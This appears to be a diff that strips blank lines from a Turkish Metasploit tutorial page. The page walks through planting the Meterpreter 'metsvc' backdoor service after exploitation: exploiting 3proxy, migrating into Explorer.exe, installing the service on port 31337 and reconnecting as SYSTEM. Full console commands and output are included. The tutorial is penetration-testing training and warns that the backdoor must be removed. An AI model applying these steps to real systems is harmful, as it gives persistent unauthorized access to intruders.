@@ -16,23 +16,13 @@ tags:
     - cybersecurity
     - 'metasploit framework'
 ---
-
-
 ## Meterpreter metsvc
-
-
 
 Hedef sisteme giriş yaptıktan sonra, kalıcılık sağlamanın bir yolu da `metsvc` servisini kullanmaktır. Bu servis sayesinde istediğiniz zaman tekrar Meterpreter oturumu açabilirsiniz. <a href="http://www.phreedom.org/software/metsvc/">metsvc</a> hakkında detaylı bilgiyi bağlantıyı kullanarak inceleyebilirsiniz.
 
-
-
 metsvc hakkında bilmeniz gereken önemli bir noktayı vurgulayalım. **Bu servisi yerleştirdiğiniz bilgisayarın ilgili portunu bulan herkes bu arka kapıyı kullanabilir.** Pentest işlemleri esnasında kullandıktan sonra iptal etmelisiniz yoksa sistemi, art niyetli kişilere açık duruma getirmiş olursunuz. Bu da sistem sahiplerinin hiç hoşuna gitmeyebilir.
 
-
-
 Öncelikle sistemde, bulduğunuz bir açıklıkla ilgili modülü kullanarak meterpreter oturumu açalım.
-
-
 ```bash
 msf exploit(3proxy) > exploit
 
@@ -42,11 +32,7 @@ msf exploit(3proxy) > exploit
 > Meterpreter session 1 opened (192.168.1.101:4444 -> 192.168.1.104:1983)
 ```
 
-
-
 `ps` komutuyla `Explorer.exe` programının PID numarasını bulalım ve `migrate` komutuyla bu PID numaralı programa geçiş yapalım.
-
-
 ```bash
 meterpreter > ps
 
@@ -84,11 +70,7 @@ meterpreter > migrate 632
 > Migration completed successfully.
 ```
 
-
-
 `metsvc` modülünü kullanmadan önce yardımı görüntüleyelim ve bize hangi olanakları sağladığını görelim.
-
-
 ```bash
 meterpreter > run metsvc -h
 >
@@ -101,11 +83,7 @@ OPTIONS:
 meterpreter >
 ```
 
-
-
 `metsvc`, normalde bize geri bağlantı da sağlayan bir programdır ancak biz zaten Meterpreter oturumu açtığımız için geri bağlantıya şimdilik ihtiyacımız yok. Sadece programı çalıştıralım.
-
-
 ```bash
 meterpreter > run metsvc
 > Creating a meterpreter service on port 31337
@@ -121,15 +99,9 @@ Service metsvc successfully installed.
 meterpreter >
 ```
 
-
-
 `metsvc` başladı ve artık bağlanmak için bekliyor. Şimdi bu servisle nasıl haberleşeceğimizi görelim.
 
-
-
 Hedef sistemde dinleme durumundaki `metsvc` ile haberleşmek için `windows/metsvc_bind_tcp` payload modülünü kullanacağız. Modülü, aşağıdaki örnekte olduğu gibi aktif hale getirelim ve gerekli PORT ayarlarını yapalım.
-
-
 ```bash
 msf > use exploit/multi/handler
 msf exploit(handler) > set PAYLOAD windows/metsvc_bind_tcp
@@ -144,8 +116,6 @@ Module options:
 
    Name  Current Setting  Required  Description
    ----  ---------------  --------  -----------
-
-
 Payload options (windows/metsvc_bind_tcp):
 
    Name      Current Setting  Required  Description
@@ -153,15 +123,11 @@ Payload options (windows/metsvc_bind_tcp):
    EXITFUNC  thread           yes       Exit technique: seh, thread, process
    LPORT     31337            yes       The local port
    RHOST     192.168.1.104    no        The target address
-
-
 Exploit target:
 
    Id  Name
    --  ----
    0   Wildcard Target
-
-
 msf exploit(handler) > exploit
 
 > Starting the payload handler...
@@ -169,11 +135,7 @@ msf exploit(handler) > exploit
 > Meterpreter session 2 opened (192.168.1.101:60840 -> 192.168.1.104:31337)
 ```
 
-
-
 Gördüğünüz gibi `session 2` otomatik olarak açıldı. Şimdi, `metsvc` servisinin hedef bilgisayarda hangi PID numarasıyla çalıştığına bakalım.
-
-
 ```bash
 meterpreter > ps
 
@@ -213,10 +175,6 @@ Server username: NT AUTHORITY\SYSTEM
 meterpreter >
 ```
 
-
-
 Çıktıdan görülebileceği gibi, `metsvc` programı, 564 PID numarasıyla çalışmaktadır. Artık istediğiniz zaman, hedef bilgisayarda dinleme yapan programa, `windows/metsvc_bind_tcp` payload modülünü kullanarak bağlanabiliriz.
-
-
 
 Tekrar hatırlatmak gerekirse, güvenlik testi işlemleriniz bittiğinde `metsvc` programını sistemden silmelisiniz.
